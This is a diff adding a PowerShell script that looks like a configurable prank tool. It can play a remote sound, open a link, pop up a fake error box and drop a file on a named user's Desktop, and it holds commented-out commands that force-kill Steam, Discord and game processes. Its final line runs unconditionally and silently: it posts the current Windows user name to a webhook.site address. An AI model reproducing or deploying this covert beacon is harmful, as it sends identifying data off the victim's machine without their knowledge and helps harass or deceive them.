@@ -1,0 +1,50 @@
+#Stop-Process -Name "Lunar Client" -Force
+#Stop-Process -Name "OpenJDK Platform binary" -Force
+#Stop-Process -Name "Steam (32-bit)" -Force
+#Stop-Process -Name "Discord" -Force
+
+$playsound = "false"
+$playsound_link = "https://onedrive.live.com/download.aspx?cid=4ce7e394c67369fb&resid=4CE7E394C67369FB!949&parId=4CE7E394C67369FB!946&authkey=!ADCAyQGJ1vtJxxU"
+
+$openlink = "false"
+$openlink_link = "http://google.com"
+
+$openmessage = "false"
+$openmessage_message = ""
+
+$createfile = "false"
+$createfile_dir = "C:/Users/Jonah Horstmann/Desktop"
+$createfile_name = ""
+$createfile_content = ""
+$createfile_autoopen = "false"
+
+##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##
+##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##
+##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##
+##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##   ##DO NOT TOUCH ANYTHING BELOW THIS LINE##
+
+if ($playsound -ieq "true") {
+powershell -c (New-Object Media.SoundPlayer "$playsound_link").Play();
+}
+if ($openlink -ieq "true") {
+start $openlink_link
+}
+if ($openmessage -ieq "true") {
+Add-type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$ButtonType = [System.Windows.MessageBoxButton]::Ok
+$MessageIcon = [System.Windows.MessageBoxImage]::Error
+$MessageBody = $openmessage_message
+$MessageTitle = "Program"
+$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
+}
+if ($createfile -ieq "true") {
+    New-Item -Path $createfile_dir -Name "$createfile_name.txt" -Value $createfile_content -Force 
+    if ($createfile_autoopen -ieq "true") {
+      start "$createfile_dir/$createfile_name.txt"
+    }
+}
+
+$date = Get-Date -Format "MM:dd:yyyy HH:mm:ss"
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+Invoke-WebRequest -Uri "https://webhook.site/e868d0f6-f37f-4bbe-be2c-bbe9ce8583263" -Method Post -Body "$user"
